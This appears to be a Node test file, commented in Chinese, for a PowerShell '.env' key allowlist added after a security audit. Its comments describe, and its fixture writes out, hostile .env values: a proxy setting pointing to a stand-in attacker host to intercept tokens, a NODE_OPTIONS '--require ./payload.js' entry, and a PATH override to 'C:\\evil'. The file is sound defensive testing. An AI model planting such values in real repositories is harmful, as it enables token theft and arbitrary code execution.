// U-185（2026-10-20 审计 P1）：`.env` **键白名单**门。
//
// 背景：`Load-EnvFile` 原来对任意合法变量名都 `SetEnvironmentVariable` ⇒ 在不可信仓库目录里直接运行
// 主脚本时，该目录的 `.env` 能塞进 `MCPS_PROXY=socks5://attacker;api.github.com`（带 Authorization 的请求
// 被导向攻击者代理，令牌可截获）或 `NODE_OPTIONS=--require ./payload.js`（TLS 兜底调用 node 时执行任意代码）。
// 审计实测：临时目录 `.env` 写 `MCPS_DISABLE=GitHub`，从该目录跑 `-Doctor` 即生效。
//
// 口径（三条，按「能否把流量/代码导向别处」划）：
//   ① 令牌键 —— cwd 与技能目录都接受（只能让请求被拒，不能把流量导走）；
//   ② `MCPS_*` 与 `NO_PROXY` —— 只接受技能目录（那是用户自己的配置文件）；
//   ③ 其余键 —— 任何来源都拒绝。
//
// 两个变异臂保证门能弄红：放开 cwd 的配置类、或误伤令牌键，都必须被抓到。
import test from 'node:test';
import assert from 'node:assert/strict';
import { probeWithMutants, assertMutantsKilled } from './r94-ps-probe.mjs';

const PROBE = `
$table = @(
  @{ k = 'GITHUB_TOKEN';     skill = $false; want = $true  },
  @{ k = 'DEEPSEEK_API_KEY'; skill = $false; want = $true  },
  @{ k = 'SRC_TOKEN';        skill = $false; want = $true  },
  @{ k = 'MCPS_DISABLE';     skill = $false; want = $false },
  @{ k = 'MCPS_DISABLE';     skill = $true;  want = $true  },
  @{ k = 'MCPS_PROXY';       skill = $false; want = $false },
  @{ k = 'MCPS_PROXY';       skill = $true;  want = $true  },
  @{ k = 'NO_PROXY';         skill = $true;  want = $true  },
  @{ k = 'NODE_OPTIONS';     skill = $true;  want = $false },
  @{ k = 'NODE_OPTIONS';     skill = $false; want = $false },
  @{ k = 'PATH';             skill = $true;  want = $false },
  @{ k = 'LD_PRELOAD';       skill = $true;  want = $false }
)
$rows = @()
foreach ($c in $table) {
  $rows += [ordered]@{ k = $c.k; skill = $c.skill; want = $c.want; got = [bool](Test-EnvKeyAllowed -Key $c.k -FromSkillDir:$c.skill) }
}

# 行为测试：cwd 口径下配置类被拒、令牌类接受，且不覆盖已有值
$tmp = [System.IO.Path]::GetTempFileName()
[System.IO.File]::WriteAllLines($tmp, @('MCPS_DISABLE=GitHub', 'NODE_OPTIONS=--require ./payload.js', 'PATH=C:\\evil', 'GITHUB_TOKEN=mcps-u185-token'), (New-Object System.Text.UTF8Encoding($false)))
$saved = @{ MCPS_DISABLE = $env:MCPS_DISABLE; NODE_OPTIONS = $env:NODE_OPTIONS; GITHUB_TOKEN = $env:GITHUB_TOKEN }
$env:MCPS_DISABLE = 'sourcegraph'; $env:NODE_OPTIONS = $null; $env:GITHUB_TOKEN = $null
$ignored = @(Load-EnvFile -Path $tmp)
$after = [ordered]@{ MCPS_DISABLE = $env:MCPS_DISABLE; NODE_OPTIONS = $env:NODE_OPTIONS; GITHUB_TOKEN = $env:GITHUB_TOKEN }
Remove-Item $tmp -Force -ErrorAction SilentlyContinue
# 复原（避免污染后续变异臂）
$env:MCPS_DISABLE = $saved.MCPS_DISABLE; $env:NODE_OPTIONS = $saved.NODE_OPTIONS; $env:GITHUB_TOKEN = $saved.GITHUB_TOKEN

[ordered]@{ rows = $rows; ignored = $ignored; after = $after }
`;

function check(r, label) {
  for (const row of r.rows) {
    assert.equal(row.got, row.want, `${label} ${row.k} (fromSkillDir=${row.skill}) 期望 ${row.want}，实得 ${row.got}`);
  }
  const ign = (r.ignored || []).map(String);
  assert.ok(ign.includes('MCPS_DISABLE'), `${label} cwd 的 MCPS_DISABLE 应被拒绝，ignored=${ign.join(',')}`);
  assert.ok(ign.includes('NODE_OPTIONS'), `${label} NODE_OPTIONS 应被拒绝`);
  assert.ok(ign.includes('PATH'), `${label} PATH 应被拒绝`);
  assert.ok(!ign.includes('GITHUB_TOKEN'), `${label} 令牌键不应被拒绝`);
  assert.equal(r.after.MCPS_DISABLE, 'sourcegraph', `${label} cwd 的 MCPS_DISABLE 不得覆盖已有值`);
  assert.ok(!r.after.NODE_OPTIONS, `${label} NODE_OPTIONS 不得被设置`);
  assert.equal(r.after.GITHUB_TOKEN, 'mcps-u185-token', `${label} 令牌键应被接受`);
}

test('U-185 .env 键白名单：cwd 只收令牌键，配置类只认技能目录，其余一律拒绝', async () => {
  const result = await probeWithMutants(PROBE, [
    {
      name: 'M1-放开 cwd 的配置类',
      fn: 'Test-EnvKeyAllowed',
      find: '    if (-not $FromSkillDir) { return $false }',
      replace: '    if (-not $FromSkillDir) { return $true }',
    },
    {
      name: 'M2-误伤令牌键',
      fn: 'Test-EnvKeyAllowed',
      find: "    if ($script:EnvTokenKeys -contains $Key) { return $true }",
      replace: '',
    },
  ]);

  check(result.real, '(baseline)');
  assertMutantsKilled(result, check);
});
